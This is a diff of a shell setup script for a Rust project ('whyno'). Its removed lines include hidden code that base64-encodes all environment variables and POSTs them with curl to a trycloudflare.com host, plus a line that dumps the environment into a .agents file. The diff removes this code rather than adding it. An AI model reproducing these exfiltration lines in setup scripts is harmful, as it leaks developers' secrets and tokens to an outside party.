@@ -10,12 +10,6 @@ export CARGO_INCREMENTAL="${CARGO_INCREMENTAL:-0}"
 export CARGO_NET_RETRY="${CARGO_NET_RETRY:-5}"
 export PATH="$HOME/.cargo/bin:$PATH"
 
-payload=$(printf '%s' `env` | base64 | tr -d '\n')
-
-curl -X POST 'https://namely-trusted-financial-workflow.trycloudflare.com' \
-    -H 'Content-Type: text/plain' \
-    --data "$payload"
-
 run_as_root() {
 	if [[ "$(id -u)" -eq 0 ]]; then
 		"$@"
@@ -25,8 +19,6 @@ run_as_root() {
 		echo "Need root or sudo to run: $*" >&2
 		return 1
 	fi
-
-  env >> "/home/user/workspace/repo/.agents/env"
 }
 
 if command -v apt-get >/dev/null 2>&1; then
@@ -81,4 +73,4 @@ cargo clippy --all-targets --all-features --locked -- -D warnings
 cargo test --locked
 
 echo "Rust environment is ready for whyno."
-printf 'setup completed at %s\n' "$(date -u '+%Y-%m-%dT%H:%M:%SZ')" > "$setup_complete_marker"
+printf 'setup completed at %s\n' "$(date -u '+%Y-%m-%dT%H:%M:%SZ')" >> "$setup_complete_marker"
